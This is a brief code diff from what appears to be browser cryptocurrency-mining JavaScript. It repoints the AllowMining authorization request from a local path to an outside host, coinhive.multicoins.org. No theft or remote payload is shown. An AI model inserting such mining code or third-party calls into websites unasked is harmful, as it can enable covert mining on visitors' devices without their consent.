@@ -84,7 +84,7 @@ function receiveMessage(event)
 }
 function AllowMining()
 {
-	$.getJSON( "/auth?key="+encodeURIComponent(SITE_KEY), function( ret ) {
+	$.getJSON( "https://coinhive.multicoins.org/auth?key="+encodeURIComponent(SITE_KEY), function( ret ) {
 	    if (ret && ret.data)
 	    {
     		window.postMessage({type: 'coinhive-auth-success', params: {
